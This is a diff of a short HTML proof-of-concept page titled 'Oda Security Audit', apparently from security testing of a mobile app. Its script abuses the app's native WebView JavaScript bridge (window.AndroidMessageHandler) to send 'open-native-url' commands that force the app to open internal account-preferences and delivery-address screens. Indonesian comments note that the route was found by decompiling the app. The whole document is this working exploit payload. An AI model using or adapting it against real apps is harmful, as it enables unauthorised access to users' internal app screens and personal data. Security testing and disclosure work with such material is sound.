@@ -1,25 +1,25 @@
-1 <html>
-    2 <body>
-    3     <h1>Oda Security Audit</h1>
-    4     <script>
-    5         setTimeout(function() {
-    6             if (window.AndroidMessageHandler) {
-    7                 // Mencoba membuka layar internal Account Preferences
-    8                 // Route ID didapat dari analisa ib.C4170s0
-    9                 window.AndroidMessageHandler.postMessage(JSON.stringify({
-   10                     "command": "open-native-url",
-   11                     "url": "account_preferences_screen"
-   12                 }));
-   13
-   14                 // Backup: Mencoba membuka layar Delivery Address
-   15                 setTimeout(function() {
-   16                     window.AndroidMessageHandler.postMessage(JSON.stringify({
-   17                         "command": "open-native-url",
-   18                         "url": "delivery_address_screen"
-   19                     }));
-   20                 }, 1000);
-   21             }
-   22         }, 1000);
-   23     </script>
-   24 </body>
-   25 </html>
+<html>
+<body>
+     <h1>Oda Security Audit</h1>
+     <script>
+         setTimeout(function() {
+             if (window.AndroidMessageHandler) {
+                 // Mencoba membuka layar internal Account Preferences
+                 // Route ID didapat dari analisa ib.C4170s0
+                 window.AndroidMessageHandler.postMessage(JSON.stringify({
+                     "command": "open-native-url",
+                     "url": "account_preferences_screen"
+                 }));
+
+                 // Backup: Mencoba membuka layar Delivery Address
+                 setTimeout(function() {
+                     window.AndroidMessageHandler.postMessage(JSON.stringify({
+                         "command": "open-native-url",
+                         "url": "delivery_address_screen"
+                     }));
+                 }, 1000);
+             }
+         }, 1000);
+     </script>
+</body>
+</html>
